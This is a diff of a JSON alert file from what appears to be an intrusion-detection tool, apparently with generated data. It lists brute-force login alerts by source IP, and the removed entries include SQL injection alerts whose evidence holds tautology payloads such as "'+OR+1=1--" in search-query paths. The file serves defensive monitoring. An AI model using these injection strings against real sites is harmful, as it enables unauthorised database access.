@@ -1,1088 +1,776 @@
 [
   {
-    "timestamp": "2026-02-21T23:59:34.133114",
+    "timestamp": "2026-02-24T00:08:44.898988",
     "rule": "Brute Force Attack",
     "severity": "HIGH",
-    "description": "Detected 15 failed login attempts from 38.23.179.221",
+    "description": "Detected 19 failed login attempts from 160.117.251.82",
     "evidence": {
-      "source_ip": "38.23.179.221",
-      "attempt_count": 15,
-      "timestamps": [
-        "2026-02-21T16:13:41+00:00",
-        "2026-02-21T16:14:11+00:00",
-        "2026-02-21T16:13:38+00:00",
-        "2026-02-21T16:13:35+00:00",
-        "2026-02-21T16:13:53+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.133417",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 15 failed login attempts from 133.94.120.221",
-    "evidence": {
-      "source_ip": "133.94.120.221",
-      "attempt_count": 15,
-      "timestamps": [
-        "2026-02-21T16:12:23+00:00",
-        "2026-02-21T16:12:08+00:00",
-        "2026-02-21T16:12:35+00:00",
-        "2026-02-21T16:12:17+00:00",
-        "2026-02-21T16:12:11+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.133562",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 13 failed login attempts from 145.18.9.140",
-    "evidence": {
-      "source_ip": "145.18.9.140",
-      "attempt_count": 13,
-      "timestamps": [
-        "2026-02-21T16:31:47+00:00",
-        "2026-02-21T16:31:37+00:00",
-        "2026-02-21T16:31:29+00:00",
-        "2026-02-21T16:31:43+00:00",
-        "2026-02-21T16:31:25+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.133718",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 17 failed login attempts from 140.150.131.222",
-    "evidence": {
-      "source_ip": "140.150.131.222",
-      "attempt_count": 17,
-      "timestamps": [
-        "2026-02-21T16:22:49+00:00",
-        "2026-02-21T16:22:45+00:00",
-        "2026-02-21T16:22:37+00:00",
-        "2026-02-21T16:22:33+00:00",
-        "2026-02-21T16:22:51+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.133940",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 15 failed login attempts from 21.139.63.168",
-    "evidence": {
-      "source_ip": "21.139.63.168",
-      "attempt_count": 15,
-      "timestamps": [
-        "2026-02-21T16:15:50+00:00",
-        "2026-02-21T16:15:44+00:00",
-        "2026-02-21T16:16:02+00:00",
-        "2026-02-21T16:16:26+00:00",
-        "2026-02-21T16:15:47+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.134141",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 12 failed login attempts from 39.33.250.88",
-    "evidence": {
-      "source_ip": "39.33.250.88",
-      "attempt_count": 12,
-      "timestamps": [
-        "2026-02-21T16:41:53+00:00",
-        "2026-02-21T16:41:59+00:00",
-        "2026-02-21T16:42:05+00:00",
-        "2026-02-21T16:41:55+00:00",
-        "2026-02-21T16:42:01+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.134315",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 13 failed login attempts from 137.139.228.218",
-    "evidence": {
-      "source_ip": "137.139.228.218",
-      "attempt_count": 13,
-      "timestamps": [
-        "2026-02-21T15:27:49+00:00",
-        "2026-02-21T15:27:47+00:00",
-        "2026-02-21T15:27:59+00:00",
-        "2026-02-21T15:27:51+00:00",
-        "2026-02-21T15:27:39+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.134544",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 13 failed login attempts from 171.229.246.155",
-    "evidence": {
-      "source_ip": "171.229.246.155",
-      "attempt_count": 13,
-      "timestamps": [
-        "2026-02-21T15:26:09+00:00",
-        "2026-02-21T15:26:05+00:00",
-        "2026-02-21T15:25:57+00:00",
-        "2026-02-21T15:25:49+00:00",
-        "2026-02-21T15:25:59+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.134609",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 18 failed login attempts from 56.89.117.252",
-    "evidence": {
-      "source_ip": "56.89.117.252",
-      "attempt_count": 18,
-      "timestamps": [
-        "2026-02-21T14:56:06+00:00",
-        "2026-02-21T14:56:18+00:00",
-        "2026-02-21T14:56:22+00:00",
-        "2026-02-21T14:56:30+00:00",
-        "2026-02-21T14:56:16+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.134776",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 14 failed login attempts from 51.36.229.100",
-    "evidence": {
-      "source_ip": "51.36.229.100",
-      "attempt_count": 14,
-      "timestamps": [
-        "2026-02-21T16:16:36+00:00",
-        "2026-02-21T16:16:26+00:00",
-        "2026-02-21T16:16:32+00:00",
-        "2026-02-21T16:16:30+00:00",
-        "2026-02-21T16:16:18+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.134951",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 15 failed login attempts from 109.200.152.62",
-    "evidence": {
-      "source_ip": "109.200.152.62",
-      "attempt_count": 15,
-      "timestamps": [
-        "2026-02-21T14:56:45+00:00",
-        "2026-02-21T14:56:53+00:00",
-        "2026-02-21T14:56:35+00:00",
-        "2026-02-21T14:56:41+00:00",
-        "2026-02-21T14:56:43+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.135141",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 15 failed login attempts from 56.255.96.142",
-    "evidence": {
-      "source_ip": "56.255.96.142",
-      "attempt_count": 15,
-      "timestamps": [
-        "2026-02-21T16:31:08+00:00",
-        "2026-02-21T16:31:14+00:00",
-        "2026-02-21T16:30:38+00:00",
-        "2026-02-21T16:31:17+00:00",
-        "2026-02-21T16:30:44+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.135291",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 20 failed login attempts from 155.212.11.102",
-    "evidence": {
-      "source_ip": "155.212.11.102",
-      "attempt_count": 20,
-      "timestamps": [
-        "2026-02-21T15:12:47+00:00",
-        "2026-02-21T15:12:59+00:00",
-        "2026-02-21T15:12:33+00:00",
-        "2026-02-21T15:13:05+00:00",
-        "2026-02-21T15:12:55+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.135364",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 15 failed login attempts from 205.25.66.108",
-    "evidence": {
-      "source_ip": "205.25.66.108",
-      "attempt_count": 15,
-      "timestamps": [
-        "2026-02-21T16:33:13+00:00",
-        "2026-02-21T16:33:22+00:00",
-        "2026-02-21T16:33:10+00:00",
-        "2026-02-21T16:32:40+00:00",
-        "2026-02-21T16:32:52+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.135425",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 14 failed login attempts from 218.118.13.79",
-    "evidence": {
-      "source_ip": "218.118.13.79",
-      "attempt_count": 14,
-      "timestamps": [
-        "2026-02-21T16:36:17+00:00",
-        "2026-02-21T16:36:19+00:00",
-        "2026-02-21T16:36:25+00:00",
-        "2026-02-21T16:36:21+00:00",
-        "2026-02-21T16:36:11+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.135482",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 16 failed login attempts from 61.28.185.236",
-    "evidence": {
-      "source_ip": "61.28.185.236",
-      "attempt_count": 16,
-      "timestamps": [
-        "2026-02-21T15:17:19+00:00",
-        "2026-02-21T15:17:13+00:00",
-        "2026-02-21T15:17:15+00:00",
-        "2026-02-21T15:17:27+00:00",
-        "2026-02-21T15:16:59+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.135540",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 17 failed login attempts from 4.112.84.92",
-    "evidence": {
-      "source_ip": "4.112.84.92",
-      "attempt_count": 17,
-      "timestamps": [
-        "2026-02-21T14:46:37+00:00",
-        "2026-02-21T14:46:41+00:00",
-        "2026-02-21T14:46:47+00:00",
-        "2026-02-21T14:46:27+00:00",
-        "2026-02-21T14:46:39+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.135734",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 15 failed login attempts from 84.42.196.247",
-    "evidence": {
-      "source_ip": "84.42.196.247",
-      "attempt_count": 15,
-      "timestamps": [
-        "2026-02-21T15:57:16+00:00",
-        "2026-02-21T15:56:58+00:00",
-        "2026-02-21T15:56:40+00:00",
-        "2026-02-21T15:57:19+00:00",
-        "2026-02-21T15:56:55+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.135833",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 15 failed login attempts from 51.26.236.35",
-    "evidence": {
-      "source_ip": "51.26.236.35",
-      "attempt_count": 15,
-      "timestamps": [
-        "2026-02-21T15:51:40+00:00",
-        "2026-02-21T15:51:52+00:00",
-        "2026-02-21T15:51:31+00:00",
-        "2026-02-21T15:51:34+00:00",
-        "2026-02-21T15:52:10+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.135919",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 16 failed login attempts from 8.164.48.114",
-    "evidence": {
-      "source_ip": "8.164.48.114",
-      "attempt_count": 16,
-      "timestamps": [
-        "2026-02-21T15:20:23+00:00",
-        "2026-02-21T15:20:15+00:00",
-        "2026-02-21T15:20:13+00:00",
-        "2026-02-21T15:20:21+00:00",
-        "2026-02-21T15:19:53+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.136101",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 14 failed login attempts from 38.170.200.119",
-    "evidence": {
-      "source_ip": "38.170.200.119",
-      "attempt_count": 14,
-      "timestamps": [
-        "2026-02-21T14:53:28+00:00",
-        "2026-02-21T14:53:18+00:00",
-        "2026-02-21T14:53:06+00:00",
-        "2026-02-21T14:53:26+00:00",
-        "2026-02-21T14:53:04+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.136210",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 15 failed login attempts from 119.224.234.41",
-    "evidence": {
-      "source_ip": "119.224.234.41",
-      "attempt_count": 15,
-      "timestamps": [
-        "2026-02-21T16:39:04+00:00",
-        "2026-02-21T16:38:49+00:00",
-        "2026-02-21T16:39:10+00:00",
-        "2026-02-21T16:39:01+00:00",
-        "2026-02-21T16:38:55+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.136356",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 15 failed login attempts from 212.205.58.26",
-    "evidence": {
-      "source_ip": "212.205.58.26",
-      "attempt_count": 15,
-      "timestamps": [
-        "2026-02-21T16:11:09+00:00",
-        "2026-02-21T16:11:45+00:00",
-        "2026-02-21T16:11:27+00:00",
-        "2026-02-21T16:11:39+00:00",
-        "2026-02-21T16:11:51+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.136455",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 15 failed login attempts from 141.149.140.10",
-    "evidence": {
-      "source_ip": "141.149.140.10",
-      "attempt_count": 15,
-      "timestamps": [
-        "2026-02-21T16:05:09+00:00",
-        "2026-02-21T16:04:48+00:00",
-        "2026-02-21T16:04:51+00:00",
-        "2026-02-21T16:05:18+00:00",
-        "2026-02-21T16:05:00+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.136534",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 17 failed login attempts from 8.227.210.108",
-    "evidence": {
-      "source_ip": "8.227.210.108",
-      "attempt_count": 17,
-      "timestamps": [
-        "2026-02-21T14:51:05+00:00",
-        "2026-02-21T14:51:03+00:00",
-        "2026-02-21T14:51:15+00:00",
-        "2026-02-21T14:51:25+00:00",
-        "2026-02-21T14:51:17+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.136707",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 14 failed login attempts from 120.132.254.75",
-    "evidence": {
-      "source_ip": "120.132.254.75",
-      "attempt_count": 14,
-      "timestamps": [
-        "2026-02-21T15:19:11+00:00",
-        "2026-02-21T15:19:05+00:00",
-        "2026-02-21T15:19:01+00:00",
-        "2026-02-21T15:19:17+00:00",
-        "2026-02-21T15:19:07+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.136886",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 15 failed login attempts from 178.135.129.67",
-    "evidence": {
-      "source_ip": "178.135.129.67",
-      "attempt_count": 15,
-      "timestamps": [
-        "2026-02-21T16:36:41+00:00",
-        "2026-02-21T16:36:20+00:00",
-        "2026-02-21T16:36:23+00:00",
-        "2026-02-21T16:36:29+00:00",
-        "2026-02-21T16:36:11+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.137237",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 15 failed login attempts from 33.153.20.236",
-    "evidence": {
-      "source_ip": "33.153.20.236",
-      "attempt_count": 15,
-      "timestamps": [
-        "2026-02-21T16:12:18+00:00",
-        "2026-02-21T16:12:30+00:00",
-        "2026-02-21T16:12:57+00:00",
-        "2026-02-21T16:12:33+00:00",
-        "2026-02-21T16:12:36+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.137340",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 13 failed login attempts from 95.87.244.54",
-    "evidence": {
-      "source_ip": "95.87.244.54",
-      "attempt_count": 13,
-      "timestamps": [
-        "2026-02-21T16:23:15+00:00",
-        "2026-02-21T16:23:23+00:00",
-        "2026-02-21T16:23:07+00:00",
-        "2026-02-21T16:23:21+00:00",
-        "2026-02-21T16:23:19+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.137497",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 18 failed login attempts from 80.139.1.166",
-    "evidence": {
-      "source_ip": "80.139.1.166",
-      "attempt_count": 18,
-      "timestamps": [
-        "2026-02-21T14:51:10+00:00",
-        "2026-02-21T14:51:26+00:00",
-        "2026-02-21T14:51:32+00:00",
-        "2026-02-21T14:51:16+00:00",
-        "2026-02-21T14:51:38+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.137737",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 19 failed login attempts from 101.232.239.36",
-    "evidence": {
-      "source_ip": "101.232.239.36",
+      "source_ip": "160.117.251.82",
       "attempt_count": 19,
       "timestamps": [
-        "2026-02-21T15:14:10+00:00",
-        "2026-02-21T15:14:14+00:00",
-        "2026-02-21T15:14:00+00:00",
-        "2026-02-21T15:14:22+00:00",
-        "2026-02-21T15:14:08+00:00"
+        "2026-02-23T12:42:58+00:00",
+        "2026-02-23T12:43:22+00:00",
+        "2026-02-23T12:43:14+00:00",
+        "2026-02-23T12:43:26+00:00",
+        "2026-02-23T12:43:16+00:00"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.137874",
+    "timestamp": "2026-02-24T00:08:44.899264",
     "rule": "Brute Force Attack",
     "severity": "HIGH",
-    "description": "Detected 11 failed login attempts from 198.13.251.182",
+    "description": "Detected 14 failed login attempts from 133.103.137.107",
     "evidence": {
-      "source_ip": "198.13.251.182",
-      "attempt_count": 11,
-      "timestamps": [
-        "2026-02-21T16:36:14+00:00",
-        "2026-02-21T16:36:16+00:00",
-        "2026-02-21T16:35:56+00:00",
-        "2026-02-21T16:36:02+00:00",
-        "2026-02-21T16:36:04+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.138029",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 12 failed login attempts from 174.70.27.182",
-    "evidence": {
-      "source_ip": "174.70.27.182",
-      "attempt_count": 12,
-      "timestamps": [
-        "2026-02-21T15:26:34+00:00",
-        "2026-02-21T15:26:26+00:00",
-        "2026-02-21T15:26:42+00:00",
-        "2026-02-21T15:26:28+00:00",
-        "2026-02-21T15:26:36+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.138132",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 16 failed login attempts from 88.218.0.137",
-    "evidence": {
-      "source_ip": "88.218.0.137",
-      "attempt_count": 16,
-      "timestamps": [
-        "2026-02-21T15:40:57+00:00",
-        "2026-02-21T15:41:27+00:00",
-        "2026-02-21T15:41:21+00:00",
-        "2026-02-21T15:41:03+00:00",
-        "2026-02-21T15:41:01+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.138328",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 12 failed login attempts from 116.32.204.43",
-    "evidence": {
-      "source_ip": "116.32.204.43",
-      "attempt_count": 12,
-      "timestamps": [
-        "2026-02-21T16:31:54+00:00",
-        "2026-02-21T16:31:52+00:00",
-        "2026-02-21T16:32:10+00:00",
-        "2026-02-21T16:31:58+00:00",
-        "2026-02-21T16:32:00+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.138515",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 15 failed login attempts from 42.124.253.25",
-    "evidence": {
-      "source_ip": "42.124.253.25",
-      "attempt_count": 15,
-      "timestamps": [
-        "2026-02-21T16:10:00+00:00",
-        "2026-02-21T16:09:57+00:00",
-        "2026-02-21T16:10:21+00:00",
-        "2026-02-21T16:09:51+00:00",
-        "2026-02-21T16:09:54+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.138625",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 14 failed login attempts from 67.11.124.122",
-    "evidence": {
-      "source_ip": "67.11.124.122",
+      "source_ip": "133.103.137.107",
       "attempt_count": 14,
       "timestamps": [
-        "2026-02-21T15:39:05+00:00",
-        "2026-02-21T15:38:53+00:00",
-        "2026-02-21T15:39:15+00:00",
-        "2026-02-21T15:39:11+00:00",
-        "2026-02-21T15:39:13+00:00"
+        "2026-02-23T10:51:10+00:00",
+        "2026-02-23T10:50:50+00:00",
+        "2026-02-23T10:51:08+00:00",
+        "2026-02-23T10:50:52+00:00",
+        "2026-02-23T10:51:02+00:00"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.138763",
+    "timestamp": "2026-02-24T00:08:44.899371",
     "rule": "Brute Force Attack",
     "severity": "HIGH",
-    "description": "Detected 13 failed login attempts from 149.56.204.157",
+    "description": "Detected 16 failed login attempts from 197.216.196.190",
     "evidence": {
-      "source_ip": "149.56.204.157",
-      "attempt_count": 13,
-      "timestamps": [
-        "2026-02-21T15:20:23+00:00",
-        "2026-02-21T15:20:33+00:00",
-        "2026-02-21T15:20:25+00:00",
-        "2026-02-21T15:20:37+00:00",
-        "2026-02-21T15:20:43+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.138844",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 16 failed login attempts from 105.24.60.203",
-    "evidence": {
-      "source_ip": "105.24.60.203",
+      "source_ip": "197.216.196.190",
       "attempt_count": 16,
       "timestamps": [
-        "2026-02-21T15:34:08+00:00",
-        "2026-02-21T15:34:04+00:00",
-        "2026-02-21T15:34:16+00:00",
-        "2026-02-21T15:33:58+00:00",
-        "2026-02-21T15:33:56+00:00"
+        "2026-02-23T12:24:09+00:00",
+        "2026-02-23T12:24:03+00:00",
+        "2026-02-23T12:23:41+00:00",
+        "2026-02-23T12:23:43+00:00",
+        "2026-02-23T12:23:47+00:00"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.138977",
+    "timestamp": "2026-02-24T00:08:44.899474",
     "rule": "Brute Force Attack",
     "severity": "HIGH",
-    "description": "Detected 15 failed login attempts from 152.28.36.180",
+    "description": "Detected 16 failed login attempts from 169.33.217.128",
     "evidence": {
-      "source_ip": "152.28.36.180",
-      "attempt_count": 15,
+      "source_ip": "169.33.217.128",
+      "attempt_count": 16,
       "timestamps": [
-        "2026-02-21T15:56:12+00:00",
-        "2026-02-21T15:56:30+00:00",
-        "2026-02-21T15:56:45+00:00",
-        "2026-02-21T15:56:09+00:00",
-        "2026-02-21T15:56:42+00:00"
+        "2026-02-23T11:22:55+00:00",
+        "2026-02-23T11:22:31+00:00",
+        "2026-02-23T11:22:35+00:00",
+        "2026-02-23T11:22:53+00:00",
+        "2026-02-23T11:22:33+00:00"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.139063",
+    "timestamp": "2026-02-24T00:08:44.899595",
     "rule": "Brute Force Attack",
     "severity": "HIGH",
-    "description": "Detected 10 failed login attempts from 140.85.70.233",
+    "description": "Detected 16 failed login attempts from 175.46.191.110",
     "evidence": {
-      "source_ip": "140.85.70.233",
-      "attempt_count": 10,
+      "source_ip": "175.46.191.110",
+      "attempt_count": 16,
       "timestamps": [
-        "2026-02-21T16:24:15+00:00",
-        "2026-02-21T16:24:17+00:00",
-        "2026-02-21T16:24:27+00:00",
-        "2026-02-21T16:24:21+00:00",
-        "2026-02-21T16:24:29+00:00"
+        "2026-02-23T10:58:54+00:00",
+        "2026-02-23T10:58:52+00:00",
+        "2026-02-23T10:59:06+00:00",
+        "2026-02-23T10:58:58+00:00",
+        "2026-02-23T10:58:56+00:00"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.139146",
+    "timestamp": "2026-02-24T00:08:44.899719",
     "rule": "Brute Force Attack",
     "severity": "HIGH",
-    "description": "Detected 15 failed login attempts from 80.25.92.156",
+    "description": "Detected 16 failed login attempts from 220.254.220.109",
     "evidence": {
-      "source_ip": "80.25.92.156",
-      "attempt_count": 15,
+      "source_ip": "220.254.220.109",
+      "attempt_count": 16,
       "timestamps": [
-        "2026-02-21T16:35:58+00:00",
-        "2026-02-21T16:36:08+00:00",
-        "2026-02-21T16:36:14+00:00",
-        "2026-02-21T16:36:12+00:00",
-        "2026-02-21T16:36:04+00:00"
+        "2026-02-23T12:40:47+00:00",
+        "2026-02-23T12:40:29+00:00",
+        "2026-02-23T12:40:27+00:00",
+        "2026-02-23T12:40:25+00:00",
+        "2026-02-23T12:40:33+00:00"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.139213",
+    "timestamp": "2026-02-24T00:08:44.899902",
     "rule": "Brute Force Attack",
     "severity": "HIGH",
-    "description": "Detected 11 failed login attempts from 184.148.200.37",
+    "description": "Detected 12 failed login attempts from 221.93.166.85",
     "evidence": {
-      "source_ip": "184.148.200.37",
-      "attempt_count": 11,
-      "timestamps": [
-        "2026-02-21T15:35:43+00:00",
-        "2026-02-21T15:35:45+00:00",
-        "2026-02-21T15:35:41+00:00",
-        "2026-02-21T15:35:35+00:00",
-        "2026-02-21T15:35:53+00:00"
-      ]
-    }
-  },
-  {
-    "timestamp": "2026-02-21T23:59:34.139423",
-    "rule": "Brute Force Attack",
-    "severity": "HIGH",
-    "description": "Detected 12 failed login attempts from 149.197.87.141",
-    "evidence": {
-      "source_ip": "149.197.87.141",
+      "source_ip": "221.93.166.85",
       "attempt_count": 12,
       "timestamps": [
-        "2026-02-21T16:07:31+00:00",
-        "2026-02-21T16:07:35+00:00",
-        "2026-02-21T16:07:47+00:00",
-        "2026-02-21T16:07:25+00:00",
-        "2026-02-21T16:07:29+00:00"
+        "2026-02-23T10:54:09+00:00",
+        "2026-02-23T10:54:13+00:00",
+        "2026-02-23T10:54:17+00:00",
+        "2026-02-23T10:54:23+00:00",
+        "2026-02-23T10:54:19+00:00"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.139632",
+    "timestamp": "2026-02-24T00:08:44.900007",
     "rule": "Brute Force Attack",
     "severity": "HIGH",
-    "description": "Detected 15 failed login attempts from 62.20.146.75",
+    "description": "Detected 18 failed login attempts from 222.177.33.179",
     "evidence": {
-      "source_ip": "62.20.146.75",
+      "source_ip": "222.177.33.179",
+      "attempt_count": 18,
+      "timestamps": [
+        "2026-02-23T11:36:17+00:00",
+        "2026-02-23T11:36:11+00:00",
+        "2026-02-23T11:36:15+00:00",
+        "2026-02-23T11:36:23+00:00",
+        "2026-02-23T11:35:53+00:00"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.900194",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 12 failed login attempts from 186.16.250.144",
+    "evidence": {
+      "source_ip": "186.16.250.144",
+      "attempt_count": 12,
+      "timestamps": [
+        "2026-02-23T12:11:40+00:00",
+        "2026-02-23T12:11:46+00:00",
+        "2026-02-23T12:11:48+00:00",
+        "2026-02-23T12:11:42+00:00",
+        "2026-02-23T12:11:38+00:00"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.900326",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 16 failed login attempts from 203.133.74.206",
+    "evidence": {
+      "source_ip": "203.133.74.206",
+      "attempt_count": 16,
+      "timestamps": [
+        "2026-02-23T12:38:22+00:00",
+        "2026-02-23T12:38:12+00:00",
+        "2026-02-23T12:38:34+00:00",
+        "2026-02-23T12:38:30+00:00",
+        "2026-02-23T12:38:16+00:00"
+      ]
+    }
+  },
+  {
+    "timestamp": "2026-02-24T00:08:44.900417",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 15 failed login attempts from 98.240.218.148",
+    "evidence": {
+      "source_ip": "98.240.218.148",
       "attempt_count": 15,
       "timestamps": [
-        "2026-02-21T15:54:57+00:00",
-        "2026-02-21T15:54:39+00:00",
-        "2026-02-21T15:54:30+00:00",
-        "2026-02-21T15:54:51+00:00",
-        "2026-02-21T15:54:54+00:00"
+        "2026-02-23T12:09:17+00:00",
+        "2026-02-23T12:09:32+00:00",
+        "2026-02-23T12:09:38+00:00",
+        "2026-02-23T12:09:23+00:00",
+        "2026-02-23T12:09:02+00:00"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.160792",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 46.252.5.232",
+    "timestamp": "2026-02-24T00:08:44.900487",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 16 failed login attempts from 38.189.246.236",
     "evidence": {
-      "source_ip": "46.252.5.232",
-      "attack_count": 1,
-      "sample_paths": [
-        "/search?q=1'+AND+'1'='1"
+      "source_ip": "38.189.246.236",
+      "attempt_count": 16,
+      "timestamps": [
+        "2026-02-23T11:01:13+00:00",
+        "2026-02-23T11:01:23+00:00",
+        "2026-02-23T11:01:03+00:00",
+        "2026-02-23T11:01:15+00:00",
+        "2026-02-23T11:01:19+00:00"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.160985",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 39.26.44.39",
+    "timestamp": "2026-02-24T00:08:44.900559",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 15 failed login attempts from 3.252.252.103",
     "evidence": {
-      "source_ip": "39.26.44.39",
-      "attack_count": 1,
-      "sample_paths": [
-        "/search?q='+OR+1=1--"
+      "source_ip": "3.252.252.103",
+      "attempt_count": 15,
+      "timestamps": [
+        "2026-02-23T11:53:49+00:00",
+        "2026-02-23T11:53:28+00:00",
+        "2026-02-23T11:53:34+00:00",
+        "2026-02-23T11:53:16+00:00",
+        "2026-02-23T11:53:31+00:00"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.161112",
-    "rule": "SQL Injection Attempt",
-    "severity": "CRITICAL",
-    "description": "SQL injection attempts detected from 213.253.228.118",
+    "timestamp": "2026-02-24T00:08:44.900669",
+    "rule": "Brute Force Attack",
+    "severity": "HIGH",
+    "description": "Detected 15 failed login attempts from 78.1.62.122",
     "evidence": {
-      "source_ip": "213.253.228.118",
-      "attack_count": 1,
-      "sample_paths": [
-        "/search?q='+OR+'1'='1"
+      "source_ip": "78.1.62.122",
+      "attempt_count": 15,
+      "timestamps": [
+        "2026-02-23T12:22:51+00:00",
+        "2026-02-23T12:23:17+00:00",
+        "2026-02-23T12:23:11+00:00",
+        "2026-02-23T12:22:49+00:00",
+        "2026-02-23T12:23:09+00:00"
       ]
     }
   },
   {
-    "timestamp": "2026-02-21T23:59:34.161248",
-    "rule": "SQL Injection Attempt",
